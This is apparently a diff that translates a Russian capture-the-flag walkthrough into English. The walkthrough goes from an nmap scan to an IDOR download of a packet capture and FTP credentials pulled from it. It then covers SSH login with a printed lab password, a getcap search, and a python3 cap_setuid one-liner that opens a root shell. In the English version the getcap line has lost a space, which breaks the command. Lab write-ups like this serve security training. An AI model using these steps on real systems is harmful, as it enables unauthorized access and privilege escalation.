@@ -1,69 +1,69 @@
-### 1. Сканирование портов и разведка сервисов (Этап Разведки)
+### 1. Port Scanning and Service Reconnaissance (Reconnaissance Phase)
 
-Поиск открытых портов и определение версий служб с помощью базового сканирования Nmap (Network Mapper):
+Finding open ports and determining service versions using a basic Nmap (Network Mapper) scan:
 
 ```text
-nmap -sC -sV -p- <IP_МАШИНЫ>
+nmap -sC -sV -p- <MACHINE_IP>
 ```
 
 ---
-### 2. Эксплуатация веб-приложения и перехват данных (Этап IDOR)
+### 2. Web Application Exploitation and Data Interception (IDOR Phase)
 
-Скачивание дампа сетевого трафика через уязвимость IDOR (Insecure Direct Object Reference) путем подмены номера в ссылке на /data/0:
+Downloading a network traffic dump through the IDOR (Insecure Direct Object Reference) vulnerability by spoofing the number in the link to /data/0:
 
 ```text
-wget http://<IP_МАШИНЫ>/data/0 -O 0.pcap
+wget http://<MACHINE_IP>/data/0 -O 0.pcap
 ```
 
 ---
-### 3. Анализ сетевого трафика и извлечение паролей (Этап Анализа PCAP)
+### 3. Network Traffic Analysis and Password Extraction (PCAP Analysis Phase)
 
-Быстрый поиск открытых учетных данных внутри файла PCAP (Packet Capture) от службы FTP (File Transfer Protocol):
+Quickly searching for clear credentials inside a PCAP (Packet Capture) file from an FTP (File Transfer) service Protocol):
 
 ```text
 strings 0.pcap | grep -i "user\|pass"
 ```
 
-Детальный парсинг трафика с помощью консольной утилиты tshark для фильтрации запросов авторизации:
+Detailed traffic parsing using the tshark command-line utility to filter authorization requests:
 
 ```text
 tshark -r 0.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg
 ```
 
 ---
-### 4. Получение первоначального доступа (Этап User)
+### 4. Gaining initial access (User Stage)
 
-Подключение к серверу по протоколу SSH (Secure Shell) с использованием найденной пары логин/пароль (nathan / Buck3tH0und#ar3di3):
+Connecting to the server via SSH (Secure Shell) using the found login/password pair (nathan / Buck3tH0und#ar3di3):
 
 ```text
-ssh nathan@<IP_МАШИНЫ>
+ssh nathan@<MACHINE_IP>
 ```
 
-Чтение первого флага пользователя в домашней директории:
+Reading the first user flag in the home directory:
 
 ```text
 cat user.txt
 ```
 
 ---
-### 5. Поиск векторов для повышения привилегий (Этап PrivEsc)
+### 5. Searching for vectors for privilege escalation (Stage PrivEsc)
 
-Поиск бинарных файлов с некорректно настроенными Capabilities (Возможности Linux), которые позволяют обходить ограничения доступа:
+Search for binaries with incorrectly configured Capabilities (Linux Capabilities) that allow bypassing access restrictions:
 
 ```text
-getcap -r / 2>/dev/null
+getcap -r /2>/dev/null
 ```
 
 ---
-### 6. Эксплуатация уязвимого бинарника и захват системы (Этап Root)
+### 6. Exploiting a vulnerable binary and taking over the system (Root Stage)
 
-Повышение прав до суперпользователя через найденный /usr/bin/python3.8 (имеющий cap_setuid) путем изменения UID (User Identifier) на 0:
+Elevating privileges to superuser via the found /usr/bin/python3.8 (which has cap_setuid) by changing the UID (User Identifier) ​​to 0:
 
 ```text
 python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 
-Проверка текущих прав и чтение главного флага администратора:
+Checking current permissions and reading the main administrator flag:
 
 ```text
 whoami && cat /root/root.txt
